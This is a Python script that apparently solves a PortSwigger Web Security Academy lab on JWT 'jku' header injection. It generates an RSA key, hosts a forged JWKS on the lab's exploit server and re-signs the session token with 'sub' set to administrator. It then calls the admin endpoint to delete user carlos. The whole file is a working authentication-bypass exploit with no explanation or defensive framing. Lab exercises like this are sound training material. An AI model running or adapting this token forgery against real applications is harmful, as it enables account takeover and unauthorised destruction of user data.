import jwt
import base64
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import re
import sys
import requests
import subprocess

subprocess.run(['openssl', 'genpkey', '-algorithm', 'RSA', '-out', 'private_key.pem', '-pkeyopt', 'rsa_keygen_bits:2048'], check=True)
subprocess.run(['openssl', 'rsa', '-in', 'private_key.pem', '-pubout', '-out', 'public_key.pem'], check=True)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
delete_url = burp_url + '/admin/delete?username=carlos'
session = requests.Session()

response = session.get(burp_url)
exploit_server = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text).group(0)
jku_url = exploit_server + '/jwks.json'

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf,"username": "wiener", "password": "peter"}

response = session.post(login_url, data=burp_data, allow_redirects=False)
cookies = response.cookies
session_cookie = cookies.get('session')

with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

decoded_token = jwt.decode(session_cookie, options={"verify_signature": False})
decoded_header = jwt.get_unverified_header(session_cookie)
decoded_token['sub'] = 'administrator'

with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
    "kid": decoded_header['kid'],
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
}
keys = {"keys": [jwk]}

burp_data = {"urlIsHttps": "on", "responseFile": "/jwks.json", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"{json.dumps(keys, indent=4)}", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jku': jku_url, 'kid': jwk['kid']})

burp_cookie = {"session": modified_token}
session.get(delete_url, cookies=burp_cookie)
